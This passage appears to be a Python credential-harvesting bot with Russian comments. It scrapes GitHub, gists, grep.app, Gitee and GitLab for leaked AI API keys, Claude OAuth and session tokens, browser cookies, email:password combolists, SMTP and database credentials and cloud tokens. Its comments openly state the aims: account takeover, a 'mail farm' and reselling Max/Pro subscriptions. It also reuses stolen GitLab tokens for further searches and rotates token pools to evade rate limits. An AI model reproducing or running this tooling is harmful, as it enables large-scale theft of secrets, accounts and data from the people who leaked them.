                files = g.get("files") or {}
                # приоритет: гисты с api/llm/openai/claude/key/.env/config в описании/именах
                is_interesting = any(
                    k in desc
                    for k in (
                        "api",
                        "key",
                        "openai",
                        "claude",
                        "llm",
                        "proxy",
                        "gpt",
                        "deepseek",
                        "moonshot",
                        "anthropic",
                        "env",
                        "config",
                        "token",
                        "free",
                        "glm",
                        "gemini",
                    )
                ) or any(
                    any(
                        k in (f.get("filename") or "").lower()
                        for k in (".env", "config", "key", "api", "token", "secret")
                    )
                    for f in files.values()
                )
                for fname, f in files.items():
                    raw = f.get("raw_url")
                    if not raw:
                        continue
                    size = f.get("size") or 0
                    if size > 400_000:
                        continue
                    # интересные гисты — все файлы, остальные — только маленькие
                    if is_interesting or size < 50_000:
                        futs[ex.submit(fetch_text, raw, (6, 15), 400_000)] = g.get(
                            "html_url", raw
                        )
            for f in concurrent.futures.as_completed(futs):
                try:
                    txt, _ = f.result()
                    if txt:
                        out.append((txt, futs[f]))
                except Exception:
                    continue
        return out


class GrepApp(Source):
    """grep.app (без токена) -> полные файлы с raw.githubusercontent.com."""

    name = "grep.app"

    def fetch(self):
        out, raw_urls, snippets = [], set(), []
        for q in CFG["grep_queries"]:
            try:
                r = http(
                    "GET",
                    "https://grep.app/api/search?q=" + urlquote(q),
                    timeout=(8, 15),
                    headers={"Accept": "application/json"},
                )
                if r.status_code != 200:
                    continue
                hits = (r.json().get("hits") or {}).get("hits") or []
                for h in hits[:15]:
                    # grep.app API: repo/branch/path — объекты {"raw": "..."},
                    # НЕ строки (был AttributeError -> весь источник молча пуст)
                    def _raw(x, default=""):
                        if isinstance(x, dict):
                            return x.get("raw") or default
                        return x or default

                    repo = _raw(h.get("repo"))
                    branch = _raw(h.get("branch"), "main")
                    path = _raw(h.get("path"))
                    if repo and path:
                        raw_urls.add(
                            "https://raw.githubusercontent.com/%s/%s/%s"
                            % (repo, branch, path.lstrip("/"))
                        )
                    snip = (h.get("content") or {}).get("snippet") or ""
                    if snip:
                        plain = htmllib.unescape(re.sub(r"<[^>]+>", "", snip))
                        snippets.append((plain, "grep.app:%s" % repo))
            except Exception:
                continue
        if raw_urls:
            with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
                futs = {
                    ex.submit(fetch_text, u, (6, 15), 500_000): u
                    for u in list(raw_urls)[:80]
                }
                for f in concurrent.futures.as_completed(futs):
                    try:
                        t, _ = f.result()
                        if t:
                            out.append((t, futs[f]))
                    except Exception:
                        continue
        out.extend(snippets)
        return out


class GitHubCode(Source):
    """GitHub code search: целясь в утечки (.env/config), НЕ README-плейсхолдеры."""

    name = "github-code"

    def fetch(self):
        if not gh_token():
            return []
        out = []
        headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + gh_token(),
        }
        import time as _t

        # реальный файл-ориентированные запросы; sort=indexed -> свежайшие утечки
        queries = [
            # 🔥 Claude OAuth (Max/Pro подписки)
            '"sk-ant-oat01"',
            '"claudeAiOauth" NOT path:README',
            '"sk-ant-ort01"',
            # из shodan2apikey: ADMIN-ключи Anthropic (орг-уровень!)
            '"sk-ant-admin01-"',
            # деплой-конфиги операторов CC-прокси (setup_token на GitHub!)
            '"setup_token" "sk-ant-oat01"',
            '"claude-code-proxy" token',
            '"cc-proxy" "sk-ant-oat01"',
            # 🔥 KIMI WEB refresh-токены (JWT user-center; живой = безлимит kimi-k3)
            '"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ1c2VyLWNlbnRlciIs"',
            '"kimi.moonshot.cn" "refresh_token"',
            '"kimi.com" "refresh_token" cookie',
            # credentials.json Claude Code (oat01+ort01+subscriptionType=max!)
            '"oauthAccount" "claudeAiOauth"',
            '".credentials.json" "accessToken"',
            '"sessionKey" "sk-ant-sid01"',
            '"sk-ant-sid02"',
            '"sessionKey" "sk-ant-sid02"',
            '"sessionKey" "claude.ai" extension:json',
            'filename:cookies.txt "claude.ai"',
            # 🍪 ЧУЖИЕ СЕССИИ: cookies с chatgpt/openai/google + пары AWS
            'filename:cookies.txt "__Secure-next-auth"',
            '"__Secure-next-auth.session-token" extension:txt',
            'filename:cookies.txt "chatgpt.com"',
            'filename:cookies.txt "SAPISID"',
            '"aws_access_key_id" "aws_secret_access_key" extension:env',
            '"xoxb-" extension:json',
            '"subscriptionType" "claudeAiOauth"',
            # конфиги AI-тульзов и CI с подписками
            '"oauthAccount" "subscriptionType"',
            '".claude.json" "oauthAccount"',
            '"CLAUDE_CODE_OAUTH_TOKEN" path:.github/workflows',
            '"claude-code-action" "oauth"',
            '"opencode" "sk-ant-"',
            '"cline" "sk-ant-api03"',
            # 🔥 КОМБЛИСТЫ email:pass -> IMAP -> ATO -> Claude web-сессии
            '"@gmail.com:" extension:txt',
            '"@gmail.com|" extension:txt',
            '"@hotmail.com:" extension:txt',
            '"@outlook.com:" extension:txt',
            "filename:combo extension:txt",
            "filename:combolist extension:txt",
            '"mail:pass" extension:txt',
            '"email:pass" extension:txt',
            '"username:password" extension:txt',
            # креды поисковиков = +ёмкость охоты
            '"SHODAN_API_KEY" path:.env',
            '"shodan.Shodan(" extension:py',
            '"CENSYS_API_ID" NOT path:README',
            '"sk-ant-api03" path:.env',
            '"sk-ant-api03" path:config',
            '"sk-ant-api03" path:settings NOT path:README',
            '"api.siliconflow.cn" "sk-" path:.env',
            '"dashscope.aliyuncs.com" "sk-" NOT path:README',
            '"modelscope" "ms-" path:.env',
            '"gpt-5.6-sol" "sk-"',
            '"glm-5.3" "sk-" NOT path:README',
            '"OPENAI_API_BASE" "sk-" path:.env',
            '"bigmodel.cn" api_key path:.env',
            '"sk-proj-" path:.env',
            '"gsk_" path:.env',
            'path:.env "anthropic"',
            'path:.env "openrouter"',
            '"sk-or-v1-" path:.env',
            '"AIza" path:.env',
            '"xai-" path:.env',
            '"hf_" path:.env',
            '"sk-live-" api',
            '"sk-ant-api03" filename:.env',
            '"sk-ant-api03" path:config',
            '"sk-proj-" filename:.env',
            '"sk-" "api.deepseek.com"',
            '"sk-" "api.groq.com"',
            '"sk-" "open.bigmodel.cn"',
            '"sk-" "api.moonshot.cn"',
            '"sk-" "api.siliconflow.cn"',
            '"sk-" "dashscope.aliyuncs.com"',
            '"sk-" "api-inference.modelscope"',
            '"sk-ant-api03" path:src',
            '"sk-ant-api03" path:app',
            '"sk-ant-api03" extension:py',
            '"sk-ant-api03" extension:js',
            '"sk-ant-api03" extension:env',
            '"sk-proj-" extension:py',
            '"sk-proj-" extension:js',
            '"sk-proj-" extension:ts',
            '"API_KEY" "claude" path:.env',
            '"ANTHROPIC_API_KEY"',
            '"OPENAI_API_KEY" path:.env',
            '"sk-" "api.tu-zi.com"',
            '"sk-" "yunwu.ai"',
            '"sk-" "api.apiyi.com"',
            '"sk-" "gpt-5.6"',
            '"sk-" "claude-opus"',
            '"sk-ant-" "claude-opus-4"',
            '"sk-or-v1" "opus"',
            # жирные relay (opus/fable живут тут, не сканируются GitHub)
            '"api.weelinking.com" "sk-"',
            '"api.laozhang.ai" "sk-"',
            '"api.nexusmind.digital" "sk-"',
            '"api.iamhc.cn" "sk-"',
            '"benchlm.ai" "sk-"',
            '"aeramc.su" "sk-"',
            '"inping.com" "sk-"',
            '"llm.alem.ai" "sk-"',
            '"v2.aicodee.com" "sk-"',
            '"api.megallm.io" "sk-"',
            '"api.bluesminds.com" "sk-"',
            '"api.ppq.ai" "sk-"',
            # 🔥 ФРОНТИР-МОДЕЛИ: код с opus-4-8/fable-5 часто содержит живые ключи
            '"claude-opus-4-8" "sk-ant"',
            '"claude-fable-5" "sk-"',
            '"oauth-2025-04-20" "sk-ant"',  # CC-прокси код с захардкоженным oat01!
            '"gpt-5.6-sol" "sk-proj"',
            '"claude-sonnet-5" "sk-ant"',
            '"anthropic-beta" "sk-ant-oat01"',
            # волна P1.3: форматы файлов + workflows + фронтир-модели
            '"sk-ant-api03" extension:sh',
            '"sk-ant-api03" extension:yml',
            '"ANTHROPIC_API_KEY" path:.github/workflows',
            '"sk-proj-" extension:json',
            '"claude-opus-4-8" "apiKey"',
            '"claude-fable-5" "sk-ant"',
            '"glm-5.3" "apiKey" NOT path:README',
            '"AIzaSy" extension:env',
            # НЕОРДИНАРНО: dotfiles с живыми Claude Code кредами
            # ~/.claude/.credentials.json содержит refreshToken (минтит свежий
            # oat01 = полный Max-аккаунт) — люди коммитят в dotfiles-репо
            '"refreshToken" ".credentials.json" path:.claude',
            '"sk-ant-ort01" extension:json',
            '"sk-ant-oat01" path:.claude extension:json',
            '"claudeAiOauth" "refreshToken" extension:json',
            '"ANTHROPIC_API_KEY" "sk-ant-api03" extension:env',
            # 🗄️ ДАМПЫ: postgres DSN / SMTP-креды в открытых .env репо
            # (ZOLTRAAK-поток: neon/supabase postgres + gmail SMTP)
            '"DATABASE_URL" extension:env',
            '"postgresql://" extension:env',
            '"postgres://" path:.env',
            '"postgresql://neondb_owner"',
            '"npg_" "neon.tech" extension:env',
            '"SUPABASE_DB" path:.env',
            '"MAIL_PASSWORD" extension:env',
            '"SMTP_PASSWORD" path:.env',
            '"smtp.gmail.com" "password" extension:env',
            '"MAILER_DSN" extension:env',
            # 🗄️ ДАМП-ВОЛНА волна-2: mongo/redis/prisma/pscale/turso + sql-дампы
            '"mongodb+srv://" extension:env',
            '"mongodb://" extension:env',
            '"rediss://" extension:env',
            '"redis://" extension:env',
            '"mysql+pymysql://"',
            '"postgresql+psycopg2://"',
            '"MYSQL_ROOT_PASSWORD" extension:env',
            '"POSTGRES_PASSWORD" extension:env',
            '"MONGO_INITDB_ROOT_PASSWORD" extension:env',
            '"pooled.db.prisma.io"',
            '"aws.connect.psdb.cloud"',
            '"libsql://" extension:env',
            '"amqp://" extension:env',
            '"-- MySQL dump" extension:sql',
            '"-- PostgreSQL database dump" extension:sql',
            '"EMAIL_HOST_PASSWORD" extension:env',
            '"discord.com/api/webhooks/" extension:env',
            # 🎫 CODEX/CHATGPT: auth.json Codex CLI + веб-сессии
            '"id_token" "account_id" "refresh_token" extension:json',
            "path:.codex auth.json",
            '"chatgpt-account-id"',
            '"__Secure-next-auth.session-token" extension:txt',
            '"chatgpt.com/backend-api/codex"',
            '"subscriptionType" "max" extension:json',
            # 🔑 BASETEN: 8.32 ключи + trussrc (конфиг truss CLI = baseten-ключ)
            '"BASETEN_API_KEY"',
            "baseten path:.env",
            '"baseten.co" "Api-Key"',
            "filename:.trussrc",
            '"BASETEN_API_KEY" extension:yml',
            '"baseten" "api_key" extension:toml',
            '"inference.baseten.co" "Api-Key"',
            # 📧 ПОЧТОВАЯ ФЕРМА: plaintext SMTP-креды в .env (проверено:
            # 115 кредов за прогон, живые ящики + подписки + ATO)
            '"MAIL_PASSWORD=" "gmail.com" NOT example',
            '"EMAIL_HOST_PASSWORD=" "gmail.com"',
            '"MAIL_USERNAME=" "MAIL_PASSWORD=" extension:env',
            '"MAIL_MAILER=smtp" "MAIL_PASSWORD=" extension:env',
            '"MAILER_DSN=smtp://"',
            '"smtp://smtp.gmail.com" "password" extension:env',
            'filename:.env "MAIL_PASSWORD" gmail',
            '"SMTP_USER" "SMTP_PASSWORD" extension:env',
            # 💎 PRO/MAX-аккаунты: credentials.json Claude Code — внутри
            # subscriptionType: "max"/"pro" + refreshToken (минтит сессию)
            '"subscriptionType" "max"',
            '"subscriptionType" "pro" claude',
            '"oauthAccount" "max" path:.claude',
            '"claudeAiOauth" "refreshToken" max',
            '"sessionKey" filename:cookies',
            '"claude.ai" "sessionKey" extension:txt',
            # 💎 MAX-КОРРЕЛЯЦИЯ: юзеры Claude Code (CLAUDE.md в репо) почти
            # наверняка имеют Max-подписку — их .env = MAX-почты!
            'filename:CLAUDE.md "MAIL_PASSWORD"',
            '"CLAUDE_CODE_OAUTH_TOKEN"',
            # 💾 SQL-дампы юзер-баз с колонками подписок (целые таблицы!)
            '"subscription_type" extension:sql',
            '"stripe_customer_id" extension:sql',
            # 💎💎 ЭКОСИСТЕМА ПЕРЕПРОДАЖИ АККАУНТОВ: MAX/PRO списки с
            # plaintext-кредами циркулируют в txt-дампах на github
            '"subscriptionType": "max"',
            "filename:.credentials.json claude",
            '"claude" "max" "@gmail.com:"',
            '"chatgpt" "plus" "@gmail.com:"',
            '"claude.ai" "password" extension:txt',
            '"premium" "@gmail.com:" extension:txt',
            '"claude max" "password"',
            # 🦠 OSV/МАЛВАРЬ-БАЗЫ: ossf/malicious-packages содержит ключи,
            # вбитые в малварь (доказано живым тестом — 2 ключа за прогон)
            "repo:ossf/malicious-packages sk-ant",
            "repo:ossf/malicious-packages sk-proj",
            "repo:ossf/malicious-packages MAIL_PASSWORD",
            'repo:ossf/malicious-packages "postgresql://"',
            # 🔑 BASETEN-МАКСИМУМ: funded-ключи прячутся в SDK-конфигах
            '"baseten.co" "inference"',
            "baseten extension:py",
            '"truss" "baseten" api',
            "BASETEN_API_TOKEN",
            # 🎯 РЕЛЕИ как tu-zi.com: конфиги релеев с их ключами
            '"api.tu-zi.com" sk-',
            '"tu-zi.com"',
            '"new-api" "sk-" extension:env',
            '"one-api" "sk-" path:.env',
            # 🔥 ENV-ДАМП волна (2026-09-09): laravel/spring/docker/litellm
            '"APP_KEY=base64:" extension:env',  # laravel: форж сессий
            '"LITELLM_MASTER_KEY" extension:env',  # litellm мастера
            '"LITELLM_MASTER_KEY" extension:yml',
            '"OPENAI_API_KEY" extension:yml path:.github',  # CI-конфиги
            '"propertySources" "password"',  # spring actuator дампы
            '"service_role" "supabase" extension:env',  # supabase service_role!
            '"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" "supabase"',  # supabase JWT
            '"firebase" "private_key" extension:json',  # GCP service accounts
            '"VERCEL_TOKEN" extension:env',
            '"RAILWAY_TOKEN" extension:env',
            '"CLOUDFLARE_API_TOKEN" extension:env',
            '"DIGITALOCEAN_TOKEN" extension:env',
            '"npm_" "registry" filename:.npmrc',  # npm tokens
            '"pypi-" filename:.pypirc',  # pypi tokens
            '"cph_"',  # codepad/прочее
            '"sk-ant-oat01" extension:log',  # логи CC сессий
            '"sk-live" "claude"',  # claude live-ключи проксей
            # 🚀 GLM-5.x / Kimi-K3 ПРОВАЙДЕР-ВОЛНА (2026-09-10): официалы и
            # кэрриеры — env-дампы с живыми ключами (zhipu/moonshot/novita...)
            '"ZHIPU_API_KEY"',
            '"ZHIPUAI_API_KEY"',
            '"GLM_API_KEY"',
            '"BIGMODEL_API_KEY"',
            '"open.bigmodel.cn" "apiKey"',
            '"api.z.ai" "api_key"',
            '"MOONSHOT_API_KEY" path:.env',
            '"MOONSHOT_API_KEY" "sk-"',
            '"api.moonshot.cn" extension:env',
            '"api.moonshot.ai" "sk-"',
            '"SILICONFLOW_API_KEY" path:.env',
            '"DEEPINFRA_API_KEY"',
            '"NOVITA_API_KEY"',
            '"CEREBRAS_API_KEY"',
            '"SAMBANOVA_API_KEY"',
            '"CHUTES_API_KEY"',
            '"HYPERBOLIC_API_KEY"',
            '"FEATHERLESS_API_KEY"',
            '"STEPFUN_API_KEY"',
            '"MINIMAX_API_KEY"',
            '"ARK_API_KEY"',  # volcengine doubao
            '"DASHSCOPE_API_KEY" path:.env',
            '"kimi-k3" "sk-"',
            '"kimi-k3" "api_key"',
            '"glm-5" "api_key" path:.env',
            '"glm-5.3" "apiKey"',
            # 🧰 OSINT-ВОЛНА (Claude-OSINT §17): секретс-менеджеры/облака/платёжки
            '"dp.pt."',  # Doppler — все секреты орга
            '"hvs." extension:env',  # Vault tokens
            '"atlasv1"',  # Terraform Cloud
            '"dop_v1_"',  # DigitalOcean
            '"PMAK-"',  # Postman (коллекции с чужими ключами)
            '"sq0atp-"',  # Square
            '"dckr_pat_"',  # Docker Hub
            '"rubygems_"',
            '"AKCp"',  # JFrog
            '"dapi" "databricks"',
            "hooks.slack.com/services",
            '"ATATT3xFfGF0"',
            '"SSWS " extension:env',  # Okta admin
            '"ya29." extension:txt',  # google oauth access tokens
            '"-us" "mailchimp" extension:env',
            '"dp.pt." extension:env',
            '"EAA" "EAAB" extension:txt',  # facebook tokens
            '"xapp-1-" extension:env',  # slack app-level
            '"glc_" extension:env',  # grafana cloud
            '"dop_v1_" extension:env',
        ]
        # 🧠 САМОУЛУЧШЕНИЕ: hot/cold статистика запросов.
        # hot (стабильно дают выдачу) — каждый цикл; cold (3 нуля подряд) —
        # ротация. Бот учится на своих прогонах какие запросы дают находки.
        QSTATS_PATH = os.path.join(HERE, "query_stats.json")
        try:
            qstats = json.load(open(QSTATS_PATH, encoding="utf-8"))
        except Exception:
            qstats = {}

        def _qget(q):
            return qstats.setdefault(q, {"runs": 0, "items": 0, "zero_streak": 0})

        try:
            hot = [
                q
                for q in queries
                if qstats.get(q, {}).get("runs", 0) >= 2
                and qstats[q].get("zero_streak", 0) == 0
                and qstats[q].get("items", 0) >= 10
            ][:12]  # 🔧 hot-кап 12 (было 6 — mail-запросы не влезали!)
        except Exception:
            hot = []
        cold = [q for q in queries if q not in hot]
        # ротация пула запросов по циклам: hot каждый раз + остальные по кругу
        # 12 запросов × sleep 7с = 84с ≈ 8.6 запр/мин — ниже лимита GH (10/мин).
        idx = int(time.time() // 600)  # меняется каждые 10 мин
        start = (idx * 6) % len(cold) if cold else 0
        rot_n = max(20 - len(hot), 8)
        rot = [cold[(start + j) % len(cold)] for j in range(rot_n)] if cold else []
        batch = list(dict.fromkeys(hot + rot))[:24]
        # 🧬 эволюция v2: мутатор стратегий (бот изобретает КАК искать)
        try:
            evolve_strategies()
        except Exception:
            pass
        # 🧬 эволюционные запросы — имена, которые система выучила сама
        try:
            for eq in evolved_queries_for_rotation(6):
                if eq not in batch:
                    batch.append(eq)
            batch = batch[:26]
        except Exception:
            pass
        # 🚀 ПАРАЛЛЕЛЬНЫЙ ДВИЖОК: 4 воркера поиска (ротация токенов пула,
        # каждый токен видит <2 поиска/мин — квота целее) + потом параллельный
        # фетч файлов. Покрытие x4-x5 за то же время = МАССОВАЯ находка ключей.
        _ratelimit_hit = threading.Event()
        _403s = [0]  # подряд идущие 403 по всему пулу (для circuit-breaker)
        _403_lock = threading.Lock()  # аудит-фикс: счётчик мутировался из 4
        # воркеров без лока — потерянные инкременты = дольше молотим 403

        def _run_query(q):
            """Один поиск: свой токен, статистика, эволюция. -> (q, items)"""
            if _ratelimit_hit.is_set():
                return q, []
            for _attempt in range(3):  # мёртвый токен -> следующий, не режем батч
                if _ratelimit_hit.is_set():
                    return q, []
                try:
                    tok = gh_token()
                    h = dict(headers)
                    h["Authorization"] = "Bearer " + tok
                    r = http(
                        "GET",
                        "https://api.github.com/search/code?q=%s&per_page=20&sort=indexed&order=desc"
                        % urlquote(q),
                        timeout=(8, 15),
                        headers=h,
                    )
                    if r.status_code == 401:
                        # токен мёртв: выкидываем из пула и пробуем другой
                        try:
                            cfg_pool = CFG.get("github_tokens_pool") or []
                            if tok in cfg_pool:
                                cfg_pool.remove(tok)
                        except Exception:
                            pass
                        continue
                    if r.status_code == 403:
                        # rate-limit токена. Retry-After (secondary RL) — уважаем.
                        # Весь пул выжат (403 подряд >= 2x pool) -> глушим батч
                        # (было: _ratelimit_hit никогда не сетился — мёртвый
                        # circuit-breaker, пул жрал 403 в 4 потока до конца)
                        ra = 0
                        try:
                            ra = int(r.headers.get("Retry-After") or 0)
                        except Exception:
                            pass
                        with _403_lock:
                            _403s[0] += 1
                            _over = (
                                _403s[0]
                                >= (len(CFG.get("github_tokens_pool") or []) or 1) * 2
                            )
                        if _over:
                            _ratelimit_hit.set()
                        _t.sleep(max(2, min(ra, 30)))
                        continue
                    if r.status_code != 200:
                        return q, []
                    with _403_lock:
                        _403s[0] = 0
                    _t.sleep(6)  # щадим квоту (только успешные; было: и на 422)
                    items = r.json().get("items", [])[:25]
                    # page 2 для hot-запросов: полная первая страница = за ней ещё
                    if q in hot and len(items) >= 20 and not _ratelimit_hit.is_set():
                        try:
                            _t.sleep(6)
                            tok2 = gh_token()
                            h2 = dict(headers)
                            h2["Authorization"] = "Bearer " + tok2
                            r3 = http(
                                "GET",
                                "https://api.github.com/search/code?q=%s&per_page=20&page=2&sort=indexed&order=desc"
                                % urlquote(q),
                                timeout=(8, 15),
                                headers=h2,
                            )
                            if r3.status_code == 200:
                                items += r3.json().get("items", [])[:25]
                        except Exception:
                            pass
                    # 🧠 учёба + 🧬 эволюция
                    try:
                        st = _qget(q)
                        st["runs"] += 1
                        st["items"] += len(items)
                        if items:
                            st["zero_streak"] = 0
                            evolved_query_hit(q, len(items))
                        else:
                            st["zero_streak"] += 1
                    except Exception:
                        pass
                    return q, items
                except Exception:
                    return q, []
            return q, []

        all_items = []  # (item, html)
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            for _q, items in ex.map(_run_query, batch):
                for item in items:
                    html = item.get("html_url") or ""
                    path = (item.get("path") or "").lower()
                    # README/доки — почти всегда плейсхолдеры; пропускаем
                    if (
                        path.endswith(("readme.md", "readme_cn.md", ".rst"))
                        and "env" not in path
                    ):
                        continue
                    all_items.append((item, html))
        if _ratelimit_hit.is_set():
            log("  [github-code] rate limit — режем батч")

        def _fetch_item(pair):
            item, html = pair
            api = item.get("url")
            # свежий токен на КАЖДЫЙ фетч (было: один токен из fetch-скоупа на
            # все 220 файлов — его смерть/ротация убивала весь фетч-пакет)
            for _try in range(2):
                try:
                    tok = gh_token()
                    if not tok:
                        break
                    h = dict(headers)
                    h["Authorization"] = "Bearer " + tok
                    r2 = http("GET", api, timeout=(6, 12), headers=h)
                    if r2.status_code in (401, 403) and _try == 0:
                        continue  # токен мёртв/релимит — другой токен, 1 ретрай
                    if r2.status_code == 200:
                        import base64

                        raw = base64.b64decode(r2.json().get("content", "")).decode(
                            "utf-8", "replace"
                        )
                        return (raw, html)
                    break
                except Exception:
                    break
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            for res in ex.map(_fetch_item, all_items[:220]):
                if res:
                    out.append(res)
        # 🧠 сохраняем выученное (переживает циклы и деплои)
        try:
            json.dump(
                qstats, open(QSTATS_PATH, "w", encoding="utf-8"), ensure_ascii=False
            )
        except Exception:
            pass
        return out


class GitHubCommits(Source):
    """GitHub commit-history: ключи, удалённые из кода, живут в старых коммитах."""

    name = "github-commits"

    def fetch(self):
        if not gh_token():
            return []
        out = []
        headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + gh_token(),
        }
        # ищем коммиты, где удаляли .env / ключи ("remove key", "remove env")
        for q in (
            # АУДИТ-фикс: commit-search не поддерживает path: — 422 каждый цикл
            '"remove api key" .env',
            '"remove secrets"',
            'revert ".env"',
            '"delete .env"',
            "oops commit",
        ):
            try:
                r = http(
                    "GET",
                    "https://api.github.com/search/commits?q=%s&per_page=15&sort=committer-date&order=desc"
                    % urlquote(q),
                    timeout=(8, 15),
                    headers=headers,
                )
                if r.status_code != 200:
                    continue
                for it in r.json().get("items", [])[:15]:
                    # diff-патчи коммитов содержат утёкшие строки
                    sha = it.get("sha")
                    repo = (it.get("repository") or {}).get("full_name")
                    if not (sha and repo):
                        continue
                    try:
                        r2 = http(
                            "GET",
                            "https://api.github.com/repos/%s/commits/%s" % (repo, sha),
                            timeout=(6, 12),
                            headers=headers,
                        )
                        if r2.status_code == 200:
                            for f in r2.json().get("files", [])[:10]:
                                patch = f.get("patch") or ""
                                if patch and any(
                                    k in patch
                                    for k in ("sk-", "api_key", "API_KEY", "ms-", "hf_")
                                ):
                                    out.append(
                                        (patch, "gh-commit:%s@%s" % (repo, sha[:8]))
                                    )
                    except Exception:
                        continue
            except Exception:
                continue
        return out


class GitHubIssues(Source):
    name = "github-issues"

    def fetch(self):
        if not gh_token():
            return []
        out = []
        headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + gh_token(),
        }
        # GitHub API требует is:issue / is:pull-request в queries
        for q in (
            'is:issue "sk-ant-api03"',
            'is:issue "sk-proj-"',
            'is:issue "api.siliconflow.cn"',
            'is:issue "modelscope" "ms-" leak',
            'is:issue "free api" claude',
        ):
            try:
                r = http(
                    "GET",
                    "https://api.github.com/search/issues?q=%s&per_page=25&sort=created&order=desc"
                    % urlquote(q),
                    timeout=(8, 15),
                    headers=headers,
                )
                if r.status_code != 200:
                    if r.status_code == 403:
                        log("  [github-issues] rate limit")
                        return out
                    continue
                for it in r.json().get("items", [])[:25]:
                    body = it.get("body") or ""
                    if body:
                        out.append((body, "gh-issue:" + str(it.get("number"))))
            except Exception:
                continue
        return out


class Gitee(Source):
    """Gitee веб-код-поиск + raw-файлы (китайские утёчки dashscope/bigmodel/moonshot)."""

    name = "gitee"

    def fetch(self):
        out = []
        for q in (
            "sk-ant-api03",
            "dashscope sk-",
            "bigmodel api_key",
            "moonshot sk-",
            "siliconflow sk-",
        ):
            try:
                r = http(
                    "GET",
                    "https://gitee.com/search?type=code&q=%s" % urlquote(q),
                    timeout=(10, 20),
                )
                if r.status_code != 200 or "登录" in (r.text or "")[:2000]:
                    return out  # код-поиск требует логин — выходим тихо
                # href="/{owner}/{repo}/blob/{branch}/{path}"
                for m in re.finditer(
                    r'href="/([A-Za-z0-9_\-]+/[A-Za-z0-9_\-\.]+)/blob/([^"]+)"', r.text
                ):
                    repo, ref = m.group(1), m.group(2)
                    try:
                        t, _ = fetch_text(
                            "https://gitee.com/%s/raw/%s" % (repo, unquote(ref)),
                            (6, 12),
                            300_000,
                        )
                        if t:
                            out.append((t, "gitee:" + repo))
                    except Exception:
                        continue
            except Exception:
                continue
        return out


class GitLab(Source):
    """GitLab: snippets API теперь 401 (нужен токен). Ищем через projects-search
    (работает без авторизации!) + вытаскиваем README и репо-файлы с ключами."""

    name = "gitlab-snippets"

    # проекты-приманки: прокси/релеи/боты часто с ключами в README и .env.example
    SEARCH_TERMS = (
        "claude-proxy",
        "openai-proxy",
        "llm-relay",
        "chatgpt-bot",
        "api-key",
        "one-api",
        "new-api",
    )
    _rot = 0
    _rot_blob = 0
    # blob-поиск по коду (scope=blobs) — требует glpat; сидим из СТОРА
    # (найденные glpat- токены работают на нас, как gh-пул)
    BLOB_QUERIES = (
        "sk-ant-oat01",
        "sk-ant-sid01",
        "sk-proj-",
        "sk-or-v1-",
        "claudeAiOauth",
        "APP_KEY=base64",
        "LITELLM_MASTER_KEY",
        "OPENAI_API_KEY",
        "xoxb-",
        "glpat-",
    )

    def _glpat_pool(self):
        pool = []
        try:
            for l in open(STORE_PATH, encoding="utf-8"):
                try:
                    j = json.loads(l)
                except Exception:
                    continue
                k = str(j.get("key") or "")
                if k.startswith("glpat-") and j.get("status") in (
                    "working",
                    "listed_only",
                ):
                    pool.append(k)
        except Exception:
            pass
        return list(dict.fromkeys(pool))

    def _blob_search(self, out):
        pool = self._glpat_pool()
        if not pool:
            return
        rot = GitLab._rot_blob
        GitLab._rot_blob = (rot + 2) % len(self.BLOB_QUERIES)
        qs = [self.BLOB_QUERIES[(rot + i) % len(self.BLOB_QUERIES)] for i in range(2)]
        tok = pool[rot % len(pool)]
        hdrs = {"PRIVATE-TOKEN": tok, "Accept": "application/json"}
        for q in qs:
            try:
                r = http(
                    "GET",
                    "https://gitlab.com/api/v4/search?scope=blobs&search=%s&per_page=20"
                    % urlquote(q),
                    timeout=(10, 20),
                    headers=hdrs,
                )
                if r is None or r.status_code in (401, 403):
                    break  # токен мёртв/без права — не насилуем
                if r.status_code == 429:
                    break
                if r.status_code != 200:
                    continue
                for b in (r.json() or [])[:20]:
                    snip = b.get("data") or ""
                    if snip.strip():
                        out.append((snip, "gitlab-blob:%s" % b.get("project_id", "?")))
                    # полный файл по пути (ключи висят кластерами)
                    pid, fpath = b.get("project_id"), b.get("path")
                    if pid and fpath:
                        for br in ("main", "master"):
                            try:
                                rr = http(
                                    "GET",
                                    "https://gitlab.com/api/v4/projects/%s"
                                    "/repository/files/%s/raw?ref=%s"
                                    % (pid, urlquote(fpath, safe=""), br),
                                    timeout=(6, 12),
                                    headers=hdrs,
                                )
                                if rr is not None and rr.status_code == 200:
                                    out.append(
                                        (
                                            rr.text[:300_000],
                                            "gitlab-file:%s:%s" % (pid, fpath[:40]),
                                        )
                                    )
                                    break
                            except Exception:
                                continue
            except Exception:
                continue

    def fetch(self):
        out = []
        # 2 термина за цикл (ротация)
        rot = GitLab._rot
        GitLab._rot = (rot + 2) % len(self.SEARCH_TERMS)
        terms = [
            self.SEARCH_TERMS[(rot + i) % len(self.SEARCH_TERMS)] for i in range(2)
        ]
        # 🩸 blob-поиск с glpat-пулом (self-seed из стора)
        try:
            self._blob_search(out)
        except Exception:
            pass
        for term in terms:
            try:
                r = http(
                    "GET",
                    "https://gitlab.com/api/v4/projects?search=%s&simple=true"
                    "&order_by=last_activity_at&per_page=10" % urlquote(term),
                    timeout=(10, 20),
                    headers={"Accept": "application/json"},
                )
                if r is None or r.status_code != 200:
                    continue
                for p in r.json()[:10]:
                    pid = p.get("id")
                    path = p.get("path_with_namespace", "?")
                    if not pid:
                        continue
                    # README через web-raw (без авторизации для публичных)
                    try:
                        web_url = p.get("web_url", "")
                        default_br = p.get("default_branch") or "main"
                        t, _ = fetch_text(
                            "%s/-/raw/%s/README.md" % (web_url, default_br),
                            (6, 12),
                            200_000,
                        )
                        if t and len(t) > 100:
                            out.append((t, "gitlab:%s" % path))
                        # .env.example — классика с реальными ключами
                        t2, _ = fetch_text(
                            "%s/-/raw/%s/.env.example" % (web_url, default_br),
                            (6, 12),
                            100_000,
                        )
                        if t2 and ("KEY" in t2 or "TOKEN" in t2):
                            out.append((t2, "gitlab-env:%s" % path))
                    except Exception:
                        continue
            except Exception:
                continue
        return out


class Sourcegraph(Source):
    """Sourcegraph stream search — код по всем форджам сразу."""

    name = "sourcegraph"

    def fetch(self):
        out = []
